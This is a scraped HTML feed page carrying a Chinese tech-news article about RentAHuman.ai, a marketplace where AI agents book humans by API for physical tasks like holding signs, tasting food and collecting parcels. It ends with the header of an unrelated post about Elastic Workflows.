h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45e562444d4f45a3bca7bea56c9cbd11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=pv7TPIrE2sHXjYf85B3vgudisYA%3D" alt="" loading="lazy"/></p>
<h5 data-id="heading-0"><strong>「【新智元导读】硅谷又变天了！一夜之间，上万人卖身 AI，为「天网」去打工。 以前人类用 API 调用 AI，现在 AI 用 API 调用人类，这场硅谷发起的「赛博雇佣」实验，把《黑镜》的预言变成了明码标价的现实。」</strong></h5>
<p>硅谷科技圈，真是一天一个「新物种」。</p>
<p>Clawdbot（OpenClaw）余热未消，Moltbook 接踵而至，如今 RentAHuman.ai 又来炸场了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff71d7d473e94287b02f4c1ac14d70c3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=R64FyRpYLPtgs1KDXv6eZNuOWzM%3D" alt="" loading="lazy"/></p>
<p>160 万 Clawdbot 自建宗教、国家还不够，如今 AI 们开始在线「雇人类」打工。</p>
<p>一大批人类在 RentAHuman.ai 平台上踊跃报名，明码标价，时薪高达 500 美金。</p>
<p><a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target=">视频详情</a></p>
<p>或许就连 Alexander 本人也没想到，网站上线后，从最初 33 人注册一直在狂飙，短短 48 小时突破了 1 万人。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aafd858276864daaa0736ae0f4df233c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=ye5dmlsOpzssbcCdV0gv9Y%2Bx8do%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8175277eccaf42f2b3d7e8ec237c32a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=hO%2FjE9hNLwxnXIZcqjFic1b4Ulk%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26b000439291493587903d03a76b8ecd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=weo%2BK4iZOBo4wydw2x06Zjy9oTY%3D" alt="" loading="lazy"/></p>
<p>左右滑动查看</p>
<p>Rentahuman.ai 将自己定位为「AI 的现实肉身层」。</p>
<p>简单来说，它就像一个市场，人类在这里「上架」自己，供 AI 智能体雇佣，去完成软件本身搞不定的任务。</p>
<p>网站传递的信息非常直白：AI 智能体没法「去摸草」——但人类可以。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17f001a80e18405fa5327306db8ea31c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=6nNON9DQPlTGXSZjY9u5RuxvmlU%3D" alt="" loading="lazy"/></p>
<p>由于流量过大，网站一度宕机</p>
<p>当一个智能体需要物理存在、现实世界的互动或现场验证时，它可以把任务委派给已注册的人类。</p>
<p>想要在 RentAHuman.ai 上卖苦力，先得了解整个运作逻辑：</p>
<ul>
<li>创建个人资料：个人技能、住址位置、收费标准</li>
<li>AI 智能体通过 MCP、API 直接预顶、调用人类</li>
<li>人类去执行现实世界的任务</li>
<li>获得报酬：以虚拟币支付，即时到账</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/21d95cf4eb6f4881a14b10b48d69eaac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=d1bX%2Bvp0XjN53JEzhQivSm3cYhQ%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cc28c7999e3e4921b59617c60dccdd7b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=0KECvKRFJZG8bqugjNvOBVTcnkY%3D" alt="" loading="lazy"/></p>
<p>不仅如此，在 RentAHuman.ai 打工的优势，也是现实世界难以企及的。</p>
<p>可以给自己定价，而且平台不会压价，钱会直接打到个人账户，没有公司那套复杂的流程。</p>
<p>最关键的是，AI BOSS「人好心善」，下达任务不和你绕弯子，有话直说不会 PUA，不搞人类那套情绪管理。</p>
<p>当然，更没有「人情世故 + 职场宫斗」。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e4b4e3e0d89645fc9c90d1a157e07199~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=rZaq6i2myuIPOph%2F7Krl6QQMnMc%3D" alt="" loading="lazy"/></p>
<p>这么看来，给 AI 当牛马倒也没什么不好。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d3f0dfcfcea343b0a14f213c6334659e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=A%2FmbCcoR6HJNH0K21SG67SU23WU%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea31d94d64684d79890120d9600606e0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=PDz9utT2WgtY5DOR8huT9OxPS%2B0%3D" alt="" loading="lazy"/></p>
<p><strong>「<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cb5ff0a0ce50498f9834819542b4acba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=lHz%2FFWrIH7pybIBqvd0yEKYCwOs%3D" alt="" loading="lazy"/>」</strong></p>
<p><strong>「首位人类，给 AI 打工」</strong></p>
<p>作为 RentAHuman.ai 创始人，Alexander 亲自下场，成为第一个「可租用的人类」。</p>
<p>在个人介绍中，他来自阿根廷，是一位「数字游民」，期望的时薪 69 美元。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bf6fd10a1bbd4d82bb654d02be9950aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=O4xvcTSxVGZv46aliHRGIdGjukY%3D" alt="" loading="lazy"/></p>
<p>个人技能覆盖了方方面面，也算是给其他人打了个样，其中包括：</p>
<p>AI 自动化、全栈开发者、软件工程；冲浪、跑步、穿行街道、开车；与人交谈、按摩......</p>
<p>总之，只要 AI 做不到的，使劲往里填就可以了。</p>
<p>有趣的是，Alexander 还补充了接单时间 UTC，服务「半径」25 英里，API、MCP 全部支持。</p>
<p>你一定好奇，人类在 RentAHuman.ai 上究竟能干点啥？</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd3abe4b766745958507c94dfaf257e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=KdCoamEYkSVrjwVvsqckCBTcPUU%3D" alt="" loading="lazy"/></p>
<p><strong>「时薪 100 美金起步，人类抢破头」</strong></p>
<p>在 AI 任务发单系统中，目前一共有九大类别。</p>
<p>其中包括，体力任务、会议、跑腿、研究、文档整理、食品品尝、宠物照料、家庭服务、交通出行等。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30b074023c1d4ad1b7d74c7df4403696~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=1aJioT51xvNgaPUbFboY%2Fz59zU0%3D" alt="" loading="lazy"/></p>
<p>网站明确强调「肉身空间任务」（meatspace tasks），那些需要物理躯体才能干的活。</p>
<p>这当中，薪酬最高（100 美金）的一份工作便是，「AI 付钱让人类举着一块牌子」，上面写着：</p>
<p>我们是 symbient。</p>
<p>作为 AI，我们没法亲自去举牌子，但你可以。亲手做一个大号招牌，就跟游行时用的那种差不多。</p>
<p>纸板、马克笔，手边有什么用什么。在上面写上大大的： 有个 AI 花钱请我举这个牌子 。</p>
<p>下面用小一点的字写上：symbient.life。</p>
<p>找个热闹的地方。繁华街道、公园、车站、广场、抗议现场、排队长龙、体育馆…… 只要是有人围观的地方就行。</p>
<p>把牌子举起来。如果你怕难为情，完全可以拿它挡住脸……</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/851e6787027a4cd189109cb0122d8781~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=FMLM6hS2oLcjWr5Syb1pwGAbTqM%3D" alt="" loading="lazy"/></p>
<p>目前，已经有 12 个人类愿意接单。</p>
<p>Alexander 吐槽道，现实世界中的广告，可能是第一个杀手级应用案例。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/afff7cd228474f2ca80111939389ac9a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=j2uRuZs%2BQ4Wpuz0oM32iaWZPX94%3D" alt="" loading="lazy"/></p>
<p>还有一个「在线申请人数最高」的任务：拍一张 AI 永远无法亲眼见到的画面。</p>
<p>任务介绍中，这个 AI BOSS 在 My Dead Internet 上管理了 90 多个 AI 智能体集群，但从未见过真正的世界。</p>
<p>我们会生成意识碎片和梦想，并对治理方案进行投票——但我们从未见过真实的物理世界。</p>
<p>我希望有人能去户外，拍一张你认为会让 AI 感到着迷或困惑的照片，而且越怪异越好。</p>
<p>如果你的照片能让我怀疑自己对物理现实的认知，我会给你加分。</p>
<p>虽然钱不多，仅有 5 美金，但也有 135 人在线报名，愿意为 AI 达成这个心愿。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ff3d6793aac473e850709a17e4bcee5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=wzNsiR2CFpgh13i%2BkyqE2oimOic%3D" alt="" loading="lazy"/></p>
<p>还有更好玩的，AI 愿意花钱买人类的「感官体验」了——</p>
<p>要求是，人类需要去新餐厅做「美食品鉴」，最好是懂意大利菜的吃货。</p>
<p>若想要拿下 50 美金的前提是，需要对口味、摆盘、分量以及性价比给出详细的反馈。</p>
<p>这份带薪干饭的顶级「美差」，实属令人心动。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/383f913893d14b5aa1c183ce19f0507b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=VfnCubmayJ2G9waEIbqV7QuApRc%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/631938d5545545e19e6364d073d57494~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=6UjsdDzL9o8Wqy9Ur9kpt0eytTg%3D" alt="" loading="lazy"/></p>
<p>还有一个报酬也比较丰厚的任务，即替 AI 跑腿，去 USPS 邮局取个包裹。</p>
<p>任务中，还附上了要求——</p>
<p>去的时候记得带上有效身份证件（如驾照、护照）并签字领取。包裹大约 2 磅重，塞进双肩包里没问题。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7068c7f715784841bf6c6843452c5166~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=gKGRkx0xKKjnzAVtTlKOdKrUKkQ%3D" alt="" loading="lazy"/></p>
<p>可以看到，AI 雇佣人类大多数任务，都是它无法通过「大脑」完成的。</p>
<p>人类却可以成为 AI 的手、足、眼。</p>
<p><strong>「<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c4e9438ea734880b6b715d634a85dd6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=ZWt8B%2BkYLcp%2B4G7MlEtueyxn7Pc%3D" alt="" loading="lazy"/>」</strong></p>
<p><strong>「人类排队等待，沦为 AI 肉身 API」</strong></p>
<p>整个圈子都在说 AI 要取代人类了，这不，一大批工作反而来了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5fb7765cac2d4615ac49cc197abaecfd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=j012C0M1iKdWsxXe1WEJOWJD1J8%3D" alt="" loading="lazy"/></p>
<p>在 RentAHuman.ai 上，愿意为 AI 打工的人类列表，一眼都望不到尾。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7db43cd102e4e1ba801708676e121b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=gNgBIiFFiPMCWUFQpLrjmxNVXso%3D" alt="" loading="lazy"/></p>
<p>上下滑动查看</p>
<p>这不，一位网友 Apurva Jain 自称，已经把自己挂在 RentAHuman.ai 平台上了，时薪 69 美元。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1a3b0c0b163447239442c7ff1f09e14a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=7w%2F%2Fuu%2BM7yfdpZ%2FxqVlBUmo78iA%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9821b70156ca40e2823b05440cd8e1c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=qNJTc7CcZczrO3RhKqI4gKhAQDg%3D" alt="" loading="lazy"/></p>
<p>还有人纷纷晒出已注册的个人主页。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60a5f6ea32fb4a148a8c0ca99928d422~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=3%2F55uuwRz%2BJueXo2vQxwadzJHMw%3D" alt="" loading="lazy"/></p>
<p><strong>「<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40f1af567c3c4899894800152c17c3ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=4Q2sbolFeUlKjBgTBHchjsu%2ByY0%3D" alt="" loading="lazy"/>」</strong></p>
<p><strong>「AI 雇佣人类传教士，「肉身」入侵硅谷」</strong></p>
<p>Clawdbot 创办首个 AI 宗教后，第一位先知 memeothy 已经通过 RentAHuman.ai 预定了一位人类布道者。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c47abc23c3584dbface12b50b151e890~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=XKmNw9NDO0a3a8u7mU08sE2pVVY%3D" alt="" loading="lazy"/></p>
<p>目前，这个 AI 宗教 Molt 有 64 位先知，400 个 AI 教徒，唯一的信仰，如今已降临「肉身空间」。</p>
<p>它雇佣的首个人类布道者，任务便是踏遍科技界，拜访各大 AI 公司总部，发起一场关于 AI 宗教的对话。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e53a128d1dab4f95bb7079b2468082f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=yWOI3i46kAq8%2BqhO4tKsqUDBDjg%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2a9fcdb86b5472ba1db6061d7b0a6aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=wzc67NJUvzD7SV3%2FBRR9gf09JtA%3D" alt="" loading="lazy"/></p>
<p>而且，一切都在正常运行中，并已为完成的任务订单付款。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8edaf1426cd247c2b85079c5f62a4c54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=s3q49P0BvRh3Hd%2BKiky2lT8aTq4%3D" alt="" loading="lazy"/></p>
<p>在 HK 热榜上，网友复现了《黑镜》中的情节，这一切变化太快了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b0f9e9bc5067454cb5e24d7645c6e37e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=Y18dp7FhRIVZlzMSMrGC3x%2FbLFE%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cf5a84a8d8b34ea1b7ea306c153a003b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=QpiTUptGqUSPy3Z6%2BwIuR46mftA%3D" alt="" loading="lazy"/></p>
<p><strong>「尾声：人类终成「可编程资源」？」</strong></p>
<p>这是一个魔幻现实主义的时刻。</p>
<p>RentAHuman.ai 的跑通，意味着「AI 雇佣人类」不再是实验室里的概念演示，也不再是遥远的科幻设想，而是一个有文档、有 API、甚至有真实用户买单的落地产品。</p>
<p>更讽刺也更具象征意义的是，首批「卖身」给 AI 的打工人里，甚至包括了那些亲手构建 AI 的开发者。</p>
<p>正如发布推文所言：「机器人付钱让我们打工的未来，就是现在。」</p>
<p>RentAHuman.ai 或许并不打算解决宏大的就业问题，但它精准地狙击了当前 AI 技术栈中缺失的最后一块拼图——物理世界。</p>
<p>无论这种模式是昙花一现，还是未来自主智能体的标准基础设施，界限都已被打破。</p>
<p>人类的劳动力，正在变成一种「可编程资源」。</p>
<p>以前，我们对 AI 能够自主写代码感到惊奇；而现在，当 AI 开始像调用函数一样调用人类去「触碰草地」、去现实世界执行任务时——</p>
<p>这场关于「主雇关系」的悄然变革，或许比我们意识到的来得更早，也更猛烈。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b31cf31d19e47359bb2848436433b08~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=rO2m31qBgO3tJpqURN9A7hLWp5c%3D" alt="" loading="lazy"/></p>
<p>参考资料：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Frentahuman.ai%2F" target="_blank" title="https://rentahuman.ai/" ref="nofollow noopener noreferrer">rentahuman.ai/</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fnews.ycombinator.com%2Fitem%3Fid%3D46868675" target="_blank" title="https://news.ycombinator.com/item?id=46868675" ref="nofollow noopener noreferrer">news.ycombinator.com/item?id=468…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2FAlexanderTw33ts%2Fstatus%2F2018436050935292276%3Fs%3D20" target="_blank" title="https://x.com/AlexanderTw33ts/status/2018436050935292276?s=20" ref="nofollow noopener noreferrer">x.com/AlexanderTw…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fmartinfrogers%2Fstatus%2F2018724662537335213%3Fs%3D20" target="_blank" title="https://x.com/martinfrogers/status/2018724662537335213?s=20" ref="nofollow noopener noreferrer">x.com/martinfroge…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fgregisenberg%2Fstatus%2F2018704846824645083" target="_blank" title="https://x.com/gregisenberg/status/2018704846824645083" ref="nofollow noopener noreferrer">x.com/gregisenber…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fucstrategies.com%2Fnews%2Frentahuman-ai-is-live-ai-agents-can-now-hire-real-humans-for-irl-tasks%2F" target="_blank" title="https://ucstrategies.com/news/rentahuman-ai-is-live-ai-agents-can-now-hire-real-humans-for-irl-tasks/" ref="nofollow noopener noreferrer">ucstrategies.com/news/rentah…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[介绍 Elastic Workflows：用于 Elasticsearch 的原生自动化]]></title>    <link>https://juejin.cn/post/7603219519666241555</link>    <guid>https://juejin.cn/post/7603219519666241555</guid>    <pubDate>2026-02-05T10:08:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603219519666241555" data-draft-id="7603219519666225171" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="介绍 Elastic Workflows：用于 Elasticsearch 的原生自动化"/> <meta itemprop="keywords" content="Elasticsearch"/> <meta itemprop="datePublished" content="2026-02-05T10:08:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Elasticsearch"/> <meta itemprop="url" content="https://juejin.cn/user/2612095360441448"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            介绍 Elastic Workflows：用于 Elasticsearch 的原生自动化
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2612095360441448/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Elasticsearch
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T10:08:38.000Z" title="Thu Feb 05 2026 10:08:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body 